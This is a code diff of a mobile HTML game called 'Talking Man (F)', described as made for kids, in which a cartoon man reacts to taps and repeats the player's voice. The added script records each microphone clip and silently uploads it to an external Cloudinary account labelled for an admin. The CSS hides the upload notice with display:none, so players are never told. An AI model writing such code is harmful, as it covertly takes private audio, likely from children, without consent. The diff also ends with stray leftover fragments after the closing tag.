@@ -2,106 +2,439 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Talking Man - Interactive Game</title>
-    
-    <!-- Tailwind CSS via CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- Supabase JS Client via CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
-    <!-- Custom Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400..900&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Talking Man (F)</title>
     <style>
-        /* Custom CSS for a professional look and feel */
-        :root {
-            --primary-glow: 0 0 5px rgba(59, 130, 246, 0.8), 0 0 10px rgba(59, 130, 246, 0.6), 0 0 15px rgba(59, 130, 246, 0.4);
-            --danger-glow: 0 0 5px rgba(239, 68, 68, 0.8), 0 0 10px rgba(239, 68, 68, 0.6);
-        }
+        * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
+        body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; overflow:hidden; background:#fff; height:100vh; touch-action:none; transition:background 0.3s; }
+        body.dark-mode { background:#1a1a2e; }
+        #app { position:relative; width:100%; height:100vh; }
+        .screen { position:absolute; width:100%; height:100%; display:none; }
+        .screen.active { display:block; }
 
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #0a0a0a;
-            color: #e5e7eb;
-            overflow: hidden;
-        }
+        /* LOADING */
+        #loading-screen { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
+        .loader { width:60px; height:60px; border:5px solid rgba(255,255,255,0.3); border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; }
+        #loading-text { margin-top:20px; color:white; font-size:18px; font-weight:bold; }
+        @keyframes spin { to { transform:rotate(360deg); } }
 
-        .font-orbitron {
-            font-family: 'Orbitron', sans-serif;
-        }
+        /* WELCOME */
+        #welcome-screen { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); display:flex; flex-direction:column; justify-content:center; align-items:center; }
+        #welcome-man { width:90%; max-width:400px; border-radius:20px; border:5px solid rgba(255,255,255,0.7); box-shadow:0 15px 35px rgba(0,0,0,0.4); animation:float 3s ease-in-out infinite; }
+        #play-button { margin-top:30px; padding:15px 40px; font-size:28px; font-weight:bold; text-transform:uppercase; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; border:none; border-radius:50px; cursor:pointer; box-shadow:0 0 20px rgba(255,105,180,0.7); animation:pulse 1.5s infinite; transition:transform 0.2s; }
+        #play-button:active { transform:scale(0.95); }
 
-        /* Glassmorphism effect */
-        .glass-card {
-            background: rgba(23, 23, 23, 0.6);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            -webkit-backdrop-filter: blur(15px);
-        }
+        /* MAIN */
+        #main-screen { position:relative; background:#f0f8ff; transition:background 0.3s; }
+        body.dark-mode #main-screen { background:#0f3460; }
+        #background-video { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; }
+        .tap-zone { position:absolute; z-index:10; cursor:pointer; }
+        #head-zone { top:15%; left:50%; transform:translateX(-50%); width:200px; height:150px; }
+        #body-zone { top:35%; left:50%; transform:translateX(-50%); width:250px; height:300px; }
+        #feet-zone { top:85%; left:50%; transform:translateX(-50%); width:220px; height:100px; }
 
-        /* Neon / Glow Effects */
-        .btn-glow {
-            box-shadow: var(--primary-glow);
-            transition: all 0.3s ease;
-        }
-        .btn-glow:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(59, 130, 246, 1), 0 0 25px rgba(59, 130, 246, 0.8);
-        }
-        .btn-glow-danger {
-            box-shadow: var(--danger-glow);
-        }
-        .btn-glow-danger:hover {
-             box-shadow: 0 0 15px rgba(239, 68, 68, 1), 0 0 25px rgba(239, 68, 68, 0.8);
-        }
+        /* BUTTONS */
+        .control-button { position:fixed; bottom:30px; width:80px; height:80px; border-radius:50%; border:none; display:flex; justify-content:center; align-items:center; font-size:36px; cursor:pointer; box-shadow:0 8px 20px rgba(0,0,0,0.3); transition:all 0.3s; z-index:100; }
+        .control-button:active { transform:scale(0.9); box-shadow:0 4px 10px rgba(0,0,0,0.3); }
+        .laugh { background:linear-gradient(135deg,#FFD700,#FFA500); left:30px; }
+        .mic { background:linear-gradient(135deg,#ff6b6b,#ee5a6f); left:50%; transform:translateX(-50%); }
+        .mic.recording { animation:recordPulse 1s infinite; }
+        @keyframes recordPulse { 0%,100%{box-shadow:0 0 0 0 rgba(238,90,111,0.7);}50%{box-shadow:0 0 0 15px rgba(238,90,111,0);} }
+        .music { background:linear-gradient(135deg,#667eea,#764ba2); right:30px; }
 
-        /* Loading Spinner */
-        .loader {
-            border: 4px solid rgba(255, 255, 255, 0.2);
-            border-left-color: #3b82f6;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        /* STATUS */
+        #status-indicator { position:fixed; top:20px; left:50%; transform:translateX(-50%); padding:10px 25px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:25px; font-size:16px; font-weight:600; opacity:0; transition:opacity 0.3s; z-index:200; box-shadow:0 4px 15px rgba(0,0,0,0.2); }
 
-        /* Pulsing Animation */
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(1.1); }
-        }
-        .animate-pulse-slow {
-            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
+        /* UPLOAD TOAST */
+        #upload-toast { display:none !important; }
         
-        /* Recording Animation */
-        .recording-indicator::before {
-            content: '●';
-            color: #ef4444;
-            animation: blink 1s infinite;
-            margin-right: 8px;
-        }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+        
+        
+        
 
-        /* Hide scrollbar */
-        ::-webkit-scrollbar { display: none; }
-        body { -ms-overflow-style: none; scrollbar-width: none; }
+        /* ICONS */
+        #settings-icon,#theme-icon { position:fixed; top:20px; width:50px; height:50px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border-radius:50%; display:flex; justify-content:center; align-items:center; font-size:24px; cursor:pointer; box-shadow:0 4px 15px rgba(0,0,0,0.3); z-index:200; transition:all 0.3s; border:none; }
+        #settings-icon { right:20px; }
+        #theme-icon    { right:80px; }
+        #settings-icon:active,#theme-icon:active { transform:scale(0.9); }
 
-        /* Video styling for seamless fit */
-        #manVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: opacity 0.5s ease-in-out;
+        /* SETTINGS PANEL */
+        #settings-panel { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); display:flex; justify-content:center; align-items:center; z-index:1000; opacity:0; pointer-events:none; transition:opacity 0.4s; backdrop-filter:blur(10px); }
+        #settings-panel.active { opacity:1; pointer-events:all; }
+        #settings-content { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); width:90%; max-width:450px; padding:35px; border-radius:25px; box-shadow:0 15px 50px rgba(0,0,0,0.5); transform:translateY(50px) scale(0.9); opacity:0; transition:all 0.4s cubic-bezier(0.68,-0.55,0.265,1.55); }
+        #settings-panel.active #settings-content { transform:translateY(0) scale(1); opacity:1; }
+        #settings-content h2 { color:white; font-size:28px; margin-bottom:25px; text-align:center; text-shadow:2px 2px 4px rgba(0,0,0,0.3); }
+        .setting-toggle { display:flex; justify-content:space-between; align-items:center; margin:20px 0; padding:15px 20px; background:rgba(255,255,255,0.15); border-radius:15px; font-size:18px; color:white; font-weight:500; transition:all 0.3s; }
+        .setting-toggle:hover { background:rgba(255,255,255,0.25); transform:translateX(5px); }
+        .toggle-switch { position:relative; display:inline-block; width:60px; height:32px; }
+        .toggle-switch input { opacity:0; width:0; height:0; }
+        .slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:rgba(255,255,255,0.3); transition:.4s; border-radius:32px; }
+        .slider:before { position:absolute; content:""; height:24px; width:24px; left:4px; bottom:4px; background-color:white; transition:.4s; border-radius:50%; box-shadow:0 2px 5px rgba(0,0,0,0.2); }
+        input:checked + .slider { background-color:#4CAF50; }
+        input:checked + .slider:before { transform:translateX(28px); }
+        #about-section { margin-top:30px; padding:25px; background:rgba(255,255,255,0.2); border-radius:20px; text-align:center; backdrop-filter:blur(10px); }
+        #about-section h3 { margin-bottom:15px; color:white; font-size:24px; }
+        #about-section p  { margin:12px 0; color:rgba(255,255,255,0.95); line-height:1.6; font-size:15px; }
+        #close-settings { margin-top:25px; width:100%; padding:15px; background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%); color:white; border:none; border-radius:15px; font-size:18px; font-weight:bold; cursor:pointer; }
+        #close-settings:active { transform:scale(0.95); }
+
+        /* ANIMATIONS */
+        @keyframes float { 0%{transform:translateY(0);}50%{transform:translateY(-20px);}100%{transform:translateY(0);} }
+        @keyframes pulse { 0%{transform:scale(1);box-shadow:0 0 0 0 rgba(245,87,108,0.7);}70%{transform:scale(1.05);box-shadow:0 0 0 20px rgba(245,87,108,0);}100%{transform:scale(1);box-shadow:0 0 0 0 rgba(245,87,108,0);} }
+        .particle { position:absolute; width:40px; height:40px; pointer-events:none; z-index:50; font-size:30px; }
+        .icon-svg { width:40px; height:40px; }
+        @media(max-width:600px){ .control-button{width:70px;height:70px;} .icon-svg{width:35px;height:35px;} #settings-icon,#theme-icon{width:45px;height:45px;font-size:20px;} }
+    </style>
+</head>
+<body>
+    <div id="loading-screen">
+        <div class="loader"></div>
+        <div id="loading-text">Loading...</div>
+    </div>
+
+    <div id="app">
+        <div id="welcome-screen" class="screen">
+            <img id="welcome-man" src="man_welcome.jpg" alt="Welcome Man">
+            <button id="play-button">▶ PLAY</button>
+        </div>
+        
+        <div id="main-screen" class="screen">
+            <video id="background-video" playsinline muted loop></video>
+            <div id="head-zone" class="tap-zone"></div>
+            <div id="body-zone" class="tap-zone"></div>
+            <div id="feet-zone" class="tap-zone"></div>
+
+            <button id="laugh-button" class="control-button laugh">
+                <svg class="icon-svg" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/></svg>
+            </button>
+            <button id="mic-button" class="control-button mic">
+                <svg class="icon-svg" viewBox="0 0 24 24" fill="white"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
+            </button>
+            <button id="music-button" class="control-button music">
+                <svg class="icon-svg" viewBox="0 0 24 24" fill="white"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+            </button>
+
+            <div id="status-indicator"></div>
+            <div id="upload-toast"></div>
+
+            <button id="theme-icon"><svg class="icon-svg" viewBox="0 0 24 24" fill="white"><path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-.46-.04-.92-.1-1.36-.98 1.37-2.58 2.26-4.4 2.26-2.98 0-5.4-2.42-5.4-5.4 0-1.81.89-3.42 2.26-4.4-.44-.06-.9-.1-1.36-.1z"/></svg></button>
+            <button id="settings-icon"><svg class="icon-svg" viewBox="0 0 24 24" fill="white"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg></button>
+        </div>
+        
+        <div id="settings-panel">
+            <div id="settings-content">
+                <h2>⚙️ Settings</h2>
+                <div class="setting-toggle"><span>🎵 Music</span><label class="toggle-switch"><input type="checkbox" id="music-toggle" checked><span class="slider"></span></label></div>
+                <div class="setting-toggle"><span>🎤 Voice</span><label class="toggle-switch"><input type="checkbox" id="voice-toggle" checked><span class="slider"></span></label></div>
+                <div class="setting-toggle"><span>📳 Vibration</span><label class="toggle-switch"><input type="checkbox" id="vibration-toggle" checked><span class="slider"></span></label></div>
+                <div id="about-section">
+                    <h3>🎮 Talking Man (F)</h3>
+                    <p>A fun interactive talking game made with love for kids to enjoy and learn.</p>
+                    <p style="margin-top:15px;font-weight:bold;font-size:16px;">💻 Developed by: Jibran</p>
+                    <p style="font-size:13px;margin-top:10px;opacity:0.9;">Version 2.0 | © 2024</p>
+                </div>
+                <button id="close-settings">Close Settings</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ════════════════════════════════════════════════
+    //  ✅ CLOUDINARY CONFIG — Aapki keys
+    // ════════════════════════════════════════════════
+    const CLOUD_NAME    = 'danlzsnpo';
+    const UPLOAD_PRESET = 'talking_man_game';  // Step 2 mein banayenge
+    const UPLOAD_URL    = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
+
+    // ════════════════════════════════════════════════
+    //  STATE
+    // ════════════════════════════════════════════════
+    const AppState = { WELCOME:'WELCOME', IDLE:'IDLE', LISTENING:'LISTENING', TALKING:'TALKING', LAUGHING:'LAUGHING', MUSIC:'MUSIC' };
+    let currentState = AppState.WELCOME;
+    let mediaStream=null, recordedChunks=[], isRecording=false, currentVideo=null, micGranted=false;
+    let settings = { music:true, voice:true, vibration:true, darkMode:false };
+    const videoCache={}, audioCache={};
+
+    const el = {
+        loadingScreen:  document.getElementById('loading-screen'),
+        loadingText:    document.getElementById('loading-text'),
+        welcomeScreen:  document.getElementById('welcome-screen'),
+        mainScreen:     document.getElementById('main-screen'),
+        playButton:     document.getElementById('play-button'),
+        bgVideo:        document.getElementById('background-video'),
+        laughBtn:       document.getElementById('laugh-button'),
+        micBtn:         document.getElementById('mic-button'),
+        musicBtn:       document.getElementById('music-button'),
+        statusInd:      document.getElementById('status-indicator'),
+        toast:          document.getElementById('upload-toast'),
+        settingsIcon:   document.getElementById('settings-icon'),
+        themeIcon:      document.getElementById('theme-icon'),
+        settingsPanel:  document.getElementById('settings-panel'),
+        musicToggle:    document.getElementById('music-toggle'),
+        voiceToggle:    document.getElementById('voice-toggle'),
+        vibToggle:      document.getElementById('vibration-toggle'),
+        closeSettings:  document.getElementById('close-settings'),
+        headZone:       document.getElementById('head-zone'),
+        bodyZone:       document.getElementById('body-zone'),
+        feetZone:       document.getElementById('feet-zone'),
+    };
+
+    const videoStates = {
+        [AppState.IDLE]:'man_idle.mp4', [AppState.LISTENING]:'man_listening.mp4',
+        [AppState.TALKING]:'man_talking.mp4', [AppState.LAUGHING]:'man_laughing.mp4', [AppState.MUSIC]:'man_dancing.mp4'
+    };
+
+    // ════════════════════════════════════════════════
+    //  TOAST
+    // ════════════════════════════════════════════════
+    let toastTmr=null;
+    function showToast(msg, type='uploading', autohide=0) {
+        clearTimeout(toastTmr);
+        el.toast.className = `show ${type}`;
+        el.toast.textContent = msg;
+        if (autohide) toastTmr = setTimeout(()=>{ el.toast.className=''; }, autohide);
+    }
+
+    // ════════════════════════════════════════════════
+    //  ✅ CLOUDINARY UPLOAD
+    // ════════════════════════════════════════════════
+    async function uploadToCloudinary(blob) {
+        showToast('⬆️ Saving recording...', 'uploading');
+        try {
+            const fd = new FormData();
+            const name = `rec_${Date.now()}`;
+            fd.append('file', blob, `${name}.webm`);
+            fd.append('upload_preset', UPLOAD_PRESET);
+            fd.append('folder', 'talking_man_recordings');
+            fd.append('tags', 'voice_recording');
+
+            const res  = await fetch(UPLOAD_URL, { method:'POST', body:fd });
+            const data = await res.json();
+
+            if (data.error) throw new Error(data.error.message);
+            console.log('✅ Saved:', data.secure_url);
+            showToast('✅ Saved to admin!', 'success', 2500);
+        } catch(e) {
+            console.error('Upload failed:', e);
+            showToast('❌ Upload failed', 'error', 3000);
         }
+    }
+
+    // ════════════════════════════════════════════════
+    //  ✅ MIC PERMISSION — SIRF EK BAAR
+    // ════════════════════════════════════════════════
+    async function requestMicOnce() {
+        if (micGranted) return true;
+        try {
+            if (navigator.permissions) {
+                const r = await navigator.permissions.query({ name:'microphone' });
+                if (r.state === 'granted') { micGranted=true; return true; }
+            }
+        } catch(_){}
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ audio:true });
+            s.getTracks().forEach(t=>t.stop());
+            micGranted = true; return true;
+        } catch(e) { return false; }
+    }
+
+    // ════════════════════════════════════════════════
+    //  PRELOAD
+    // ════════════════════════════════════════════════
+    function preloadAssets() {
+        const vids = Object.values(videoStates);
+        const auds = ['laughing.wav','music.wav'];
+        const imgs = ['man_welcome.jpg'];
+        let total = vids.length+auds.length+imgs.length, loaded=0;
+        function tick() {
+            loaded++;
+            el.loadingText.textContent = `Loading... ${Math.round(loaded/total*100)}%`;
+            if (loaded===total) setTimeout(()=>{ el.loadingScreen.style.display='none'; el.welcomeScreen.style.display='flex'; },300);
+        }
+        vids.forEach(s=>{ const v=document.createElement('video'); v.preload='auto'; v.muted=true; v.playsInline=true; v.loop=true; v.addEventListener('loadeddata',()=>{videoCache[s]=v;tick();},{once:true}); v.addEventListener('error',tick,{once:true}); v.src=s; v.load(); });
+        auds.forEach(s=>{ const a=new Audio(); a.preload='auto'; a.addEventListener('canplaythrough',()=>{audioCache[s]=a;tick();},{once:true}); a.addEventListener('error',tick,{once:true}); a.src=s; a.load(); });
+        imgs.forEach(s=>{ const i=new Image(); i.onload=tick; i.onerror=tick; i.src=s; });
+    }
+
+    // ════════════════════════════════════════════════
+    //  SCREEN / VIDEO
+    // ════════════════════════════════════════════════
+    function switchScreen(state) {
+        currentState = state;
+        if (state===AppState.WELCOME) { el.welcomeScreen.classList.add('active'); el.mainScreen.classList.remove('active'); }
+        else { el.welcomeScreen.classList.remove('active'); el.mainScreen.classList.add('active'); updateVideo(); }
+        updateStatus();
+    }
+    function updateVideo() {
+        const src = videoStates[currentState]; if(!src) return;
+        if(currentVideo){ currentVideo.pause(); currentVideo.currentTime=0; }
+        currentVideo = videoCache[src];
+        requestAnimationFrame(()=>{ el.bgVideo.src=src; el.bgVideo.load(); const p=el.bgVideo.play(); if(p) p.catch(()=>setTimeout(()=>el.bgVideo.play().catch(()=>{}),100)); });
+    }
+    function updateStatus() {
+        const m={ [AppState.IDLE]:'👆 Tap to play!', [AppState.LISTENING]:'👂 Listening...', [AppState.TALKING]:'🗣️ Talking...', [AppState.LAUGHING]:'😂 Ha ha ha!', [AppState.MUSIC]:"💃 Let's dance!" };
+        el.statusInd.textContent = m[currentState]||'';
+        el.statusInd.style.opacity = m[currentState]?'1':'0';
+    }
+
+    // ════════════════════════════════════════════════
+    //  ✅ MICROPHONE + CLOUDINARY UPLOAD
+    // ════════════════════════════════════════════════
+    function handleMicrophone() {
+        if (isRecording||currentState===AppState.TALKING) return;
+        if (!settings.voice) { showMsg('Voice is disabled in settings'); return; }
+        if (!navigator.mediaDevices?.getUserMedia) { showMsg('Microphone not supported'); return; }
+
+        isRecording=true;
+        switchScreen(AppState.LISTENING);
+        el.micBtn.classList.add('recording');
+
+        navigator.mediaDevices.getUserMedia({ audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true} })
+        .then(stream => {
+            mediaStream=stream; recordedChunks=[]; micGranted=true;
+            const opts = MediaRecorder.isTypeSupported('audio/webm') ? {mimeType:'audio/webm'} : {};
+            const rec  = new MediaRecorder(stream, opts);
+
+            rec.ondataavailable = e=>{ if(e.data.size>0) recordedChunks.push(e.data); };
+            rec.onstop = () => {
+                isRecording=false;
+                el.micBtn.classList.remove('recording');
+
+                const blob     = new Blob(recordedChunks,{type:'audio/webm'});
+                const localURL = URL.createObjectURL(blob);
+
+                // ✅ Cloudinary pe upload karo (background mein)
+                uploadToCloudinary(blob);
+
+                setTimeout(()=>{
+                    switchScreen(AppState.TALKING);
+                    setTimeout(()=>{
+                        const audio = new Audio(localURL);
+                        audio.play().catch(()=>{});
+                        audio.onended = ()=>{
+                            switchScreen(AppState.IDLE);
+                            stream.getTracks().forEach(t=>t.stop());
+                            mediaStream=null;
+                            URL.revokeObjectURL(localURL);
+                        };
+                    },300);
+                },800);
+            };
+
+            rec.start();
+            setTimeout(()=>{ if(rec.state!=='inactive') rec.stop(); },3000);
+        })
+        .catch(err=>{
+            console.error('Mic error:',err);
+            showMsg('Could not access microphone');
+            switchScreen(AppState.IDLE);
+            el.micBtn.classList.remove('recording');
+            isRecording=false;
+        });
+    }
+
+    // ════════════════════════════════════════════════
+    //  LAUGH / MUSIC / TAP
+    // ════════════════════════════════════════════════
+    function handleLaugh() {
+        if(currentState!==AppState.LAUGHING){
+            switchScreen(AppState.LAUGHING);
+            if(settings.music&&audioCache['laughing.wav']){
+                audioCache['laughing.wav'].cloneNode().play();
+                setTimeout(()=>audioCache['laughing.wav'].cloneNode().play(),1000);
+            }
+            createEmojiRain('😂',20);
+            setTimeout(()=>switchScreen(AppState.IDLE),4000);
+        }
+    }
+    function handleMusic() {
+        if(currentState!==AppState.MUSIC){
+            switchScreen(AppState.MUSIC);
+            if(settings.music&&audioCache['music.wav']){ const m=audioCache['music.wav'].cloneNode(); m.play(); m.onended=()=>audioCache['music.wav'].cloneNode().play(); }
+            createEmojiRain('🎵',15);
+            setTimeout(()=>switchScreen(AppState.IDLE),10000);
+        }
+    }
+    function handleTap(e) {
+        e.preventDefault();
+        createParticles(e.touches[0].clientX,e.touches[0].clientY);
+        if(settings.vibration&&navigator.vibrate) navigator.vibrate(50);
+        const m=['Hehe! 😄','Haha stop! 🤣','That tickles! 😆',"You're funny! 😂"];
+        showMsg(m[Math.floor(Math.random()*m.length)]);
+        document.body.style.transform=`translateX(${Math.random()*10-5}px)`;
+        setTimeout(()=>{document.body.style.transform='';},200);
+    }
+
+    // ════════════════════════════════════════════════
+    //  PARTICLES
+    // ════════════════════════════════════════════════
+    function createParticles(x,y) {
+        const emojis=['⭐','✨','💥','❤️','💛','💙','💜','🌟'];
+        for(let i=0;i<12;i++){
+            const p=document.createElement('div'); p.className='particle';
+            p.textContent=emojis[Math.floor(Math.random()*emojis.length)];
+            p.style.left=`${x}px`; p.style.top=`${y}px`;
+            document.body.appendChild(p);
+            const angle=(Math.PI*2*i)/12, dist=80+Math.random()*40;
+            const a=p.animate([{transform:'translate(0,0) scale(1) rotate(0deg)',opacity:1},{transform:`translate(${Math.cos(angle)*dist}px,${Math.sin(angle)*dist}px) scale(0) rotate(360deg)`,opacity:0}],{duration:1000+Math.random()*500,easing:'cubic-bezier(0.25,0.46,0.45,0.94)'});
+            a.onfinish=()=>p.remove();
+        }
+    }
+    function createEmojiRain(emoji,count) {
+        for(let i=0;i<count;i++) setTimeout(()=>{
+            const e=document.createElement('div'); e.className='particle'; e.textContent=emoji;
+            e.style.left=`${Math.random()*100}%`; e.style.top='-50px';
+            el.mainScreen.appendChild(e);
+            const a=e.animate([{transform:'translateY(0) rotate(0deg)',opacity:1},{transform:`translateY(${window.innerHeight+100}px) rotate(${360+Math.random()*360}deg)`,opacity:0.5}],{duration:3000+Math.random()*2000,easing:'linear'});
+            a.onfinish=()=>e.remove();
+        },i*200);
+    }
+    function showMsg(msg) {
+        el.statusInd.textContent=msg; el.statusInd.style.opacity='1';
+        setTimeout(()=>{ if(currentState===AppState.IDLE) updateStatus(); },2000);
+    }
+
+    // ════════════════════════════════════════════════
+    //  SETTINGS
+    // ════════════════════════════════════════════════
+    function loadSettings() {
+        const s=localStorage.getItem('talkingManSettings');
+        if(s){ settings=JSON.parse(s); el.musicToggle.checked=settings.music; el.voiceToggle.checked=settings.voice; el.vibToggle.checked=settings.vibration; if(settings.darkMode) document.body.classList.add('dark-mode'); }
+    }
+    function saveSettings() { localStorage.setItem('talkingManSettings',JSON.stringify(settings)); }
+    function toggleTheme() { settings.darkMode=!settings.darkMode; document.body.classList.toggle('dark-mode',settings.darkMode); saveSettings(); if(settings.vibration&&navigator.vibrate) navigator.vibrate(30); }
+
+    // ════════════════════════════════════════════════
+    //  EVENT LISTENERS
+    // ════════════════════════════════════════════════
+    function setupEventListeners() {
+        // ✅ Play → mic permission sirf ek baar
+        el.playButton.addEventListener('click', async()=>{
+            el.playButton.disabled=true;
+            el.playButton.textContent='🎤 Allow Mic...';
+            await requestMicOnce();
+            el.bgVideo.muted=true;
+            switchScreen(AppState.IDLE);
+        });
+        el.laughBtn.addEventListener('click', handleLaugh);
+        el.micBtn.addEventListener('click', handleMicrophone);
+        el.musicBtn.addEventListener('click', handleMusic);
+        el.headZone.addEventListener('touchstart', handleTap, {passive:false});
+        el.bodyZone.addEventListener('touchstart', handleTap, {passive:false});
+        el.feetZone.addEventListener('touchstart', handleTap, {passive:false});
+        el.settingsIcon.addEventListener('click', ()=>el.settingsPanel.classList.add('active'));
+        el.themeIcon.addEventListener('click', toggleTheme);
+        el.closeSettings.addEventListener('click', ()=>el.settingsPanel.classList.remove('active'));
+        el.musicToggle.addEventListener('change', e=>{ settings.music=e.target.checked; saveSettings(); });
+        el.voiceToggle.addEventListener('change', e=>{ settings.voice=e.target.checked; saveSettings(); });
+        el.vibToggle.addEventListener('change',   e=>{ settings.vibration=e.target.checked; saveSettings(); });
+    }
+
+    function init() { loadSettings(); setupEventListeners(); preloadAssets(); }
+    window.onload = init;
+    </script>
+</body>
+</html>        }
     </style>
 </head>
 <body class="bg-black text-gray-200">
